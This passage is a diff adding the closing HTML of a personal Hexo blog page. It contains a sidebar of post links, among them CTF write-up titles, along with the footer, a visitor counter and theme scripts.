class="post-list-link" href="../../../09/24/【WriteUp】Jarvis OJ--Pwn题解/">【WriteUp】Jarvis OJ--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../09/19/【BugkuCTF】Pwn题解/">【BugkuCTF】Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../09/11/【杂项】C语言函数总结/">【杂项】C语言函数总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../09/10/【Pwn 笔记】堆利用总结--空闲块篇/">【Pwn 笔记】堆利用总结--空闲块篇</a></li><li class="post-list-item"><a class="post-list-link" href="../../../09/09/【Hexo】让Github Pages被索引到/">【Hexo】让Github Pages被索引到</a></li><li class="post-list-item"><a class="post-list-link" href="../../../09/09/【Hexo】更改Yelee主题内部文件为自己想要的样式/">【Hexo】更改Yelee主题内部文件为自己想要的样式</a></li><li class="post-list-item"><a class="post-list-link" href="../../../09/09/【Gem】gem安装教程/">【Gem】gem安装教程</a></li><li class="post-list-item"><a class="post-list-link" href="../../../09/08/【TokyoWesterns CTF 5th 2019】Web--j2x2j/">【TokyoWesterns CTF 5th 2019】Web--J2x2j</a></li><li class="post-list-item"><a class="post-list-link" href="../../../09/08/【TokyoWesterns CTF 5th 2019】Pwn--nothing more to say/">【TokyoWesterns CTF 5th 2019】Pwn--Nothing More to Say</a></li><li class="post-list-item"><a class="post-list-link" href="../../../09/08/【TokyoWesterns CTF 5th 2019】Crypto--real-baby-rsa/">【TokyoWesterns CTF 5th 2019】Crypto--Real-Baby-Rsa</a></li><li class="post-list-item"><a class="post-list-link" href="../../../09/08/【杂项】本人的CTF writeup模板/">【杂项】本人的CTF Writeup模板</a></li><li class="post-list-item"><a class="post-list-link" href="../../../09/08/【TokyoWesterns CTF 5th 2019】Misc--Welcome!!/">【TokyoWesterns CTF 5th 2019】Misc--Welcome!!</a></li><li class="post-list-item"><a class="post-list-link" href="../../../09/08/【Hexo】安装hexo的一系列组件-Step1/">【Hexo】安装hexo的一系列组件--Step1</a></li><li class="post-list-item"><a class="post-list-link" href="../../../09/08/【Hexo】搭建博客时遇到的问题/">【Hexo】搭建博客时遇到的问题</a></li><li class="post-list-item"><a class="post-list-link" href="../../../09/07/【Npm】npm问题归总/">【Npm】npm问题汇总</a></li><li class="post-list-item"><a class="post-list-link" href="../../../09/07/【Hexo】搭建GitHub博客--Step2/">【Hexo】搭建GitHub博客--Step2</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019-2020 binLep
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+    <script src="../../../../js/GithubRepoWidget.js"></script>
+
+<script data-main="/js/main.js" src="//cdnjs.cloudflare.com/ajax/libs/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+             github: ".github-widget a", 
+             title: "a.article-title, .article-more-link a", 
+             post: ".article-entry a[href], .copyright a[href]", 
+             tags: ".article-tag a", 
+             categories: ".article-category a, a.tag-list-link", 
+             articleNav: "#article-nav a, #post-nav-button a", 
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+             menu: ".header-menu a", 
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  </div>
+</body>
+</html>
